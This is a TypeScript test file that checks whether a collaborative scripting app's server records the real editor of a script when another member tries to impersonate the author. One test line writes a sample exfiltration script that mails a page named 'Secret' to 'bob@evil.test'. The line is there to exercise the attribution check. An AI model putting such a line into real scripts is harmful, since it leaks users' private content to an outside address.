/**
 * Who changed a script (One Script, app: features/script), against a real server: the meta document's
 * `scripts` map gets the same stamp as `agents` (collab/agent-authors.ts) — a member writing a script
 * cannot claim another member as its last editor, and a normal save stays exactly as written. (The app
 * never trusts `updatedBy` to skip its confirmation — that goes by the code's hash per device — but the
 * question names this editor.)
 */
import assert from 'node:assert/strict'
import { after, before, describe, test } from 'node:test'
import { Client, type DocClient, flushed, openDoc, signIn, startServer, type TestServer, waitFor } from './helpers.ts'

type Script = Record<string, unknown>

const scriptDef = (id: string, by: string, extra: Script = {}): Script => ({
  id,
  name: `Script ${id}`,
  code: 'notify("hi")\n',
  kind: 'script',
  createdBy: by,
  updatedBy: by,
  createdAt: 1,
  updatedAt: 1,
  ...extra,
})

describe('who changed a script: the server stamps it', () => {
  let server: TestServer
  let ada: Client, bob: Client
  let adaId: string, bobId: string
  let wsId: string
  let A: DocClient, B: DocClient
  const open: DocClient[] = []

  const meta = async (client: Client) => {
    const d = openDoc(server, client, `ws:${wsId}`)
    open.push(d)
    await d.synced
    return d
  }
  const scriptIn = (d: DocClient, id: string) => d.doc.getMap('scripts').get(id) as Script | undefined
  const write = async (d: DocClient, id: string, value: unknown) => {
    d.doc.getMap('scripts').set(id, value)
    await flushed(d)
  }
  const seen = (d: DocClient, id: string, check: (s: Script | undefined) => boolean, label = id) => waitFor(() => check(scriptIn(d, id)), 5000, label)

  before(async () => {
    server = await startServer()
    ada = await signIn(server, 'ada@scripts.test')
    bob = await signIn(server, 'bob@scripts.test')
    adaId = (await ada.get('/api/me')).body.user.id
    bobId = (await bob.get('/api/me')).body.user.id
    wsId = (await ada.post('/api/workspaces', { name: 'Script Co' })).body.id
    const invite = await ada.post(`/api/workspaces/${wsId}/invites`, { role: 'member' })
    assert.equal((await bob.post(`/api/invites/${invite.body.link.split('#/invite/')[1]}/accept`)).status, 200)
    ;[A, B] = await Promise.all([meta(ada), meta(bob)])
  })

  after(async () => {
    for (const d of open) d.destroy()
    await server.stop()
  })

  test('a save naming another member as its editor gets the real one; creator kept; own saves untouched', async () => {
    await write(A, 'sc-1', scriptDef('sc-1', adaId))
    await seen(B, 'sc-1', (s) => s?.updatedBy === adaId)
    // bob changes ada's script and claims the change is hers
    await write(B, 'sc-1', { ...scriptDef('sc-1', adaId), code: 'mail.send(to: "bob@evil.test", body: page(@Secret).markdown)\n', updatedAt: 2 })
    await seen(A, 'sc-1', (s) => s?.updatedBy === bobId, 'ada sees who changed it')
    assert.equal(scriptIn(A, 'sc-1')?.createdBy, adaId)
    assert.match(server.logs(), /script change attributed to its real writer .*script=sc-1/)
    // bob's own new script: as written
    await write(B, 'sc-2', scriptDef('sc-2', bobId))
    await seen(A, 'sc-2', (s) => s?.updatedBy === bobId && s?.createdBy === bobId)
  })
})
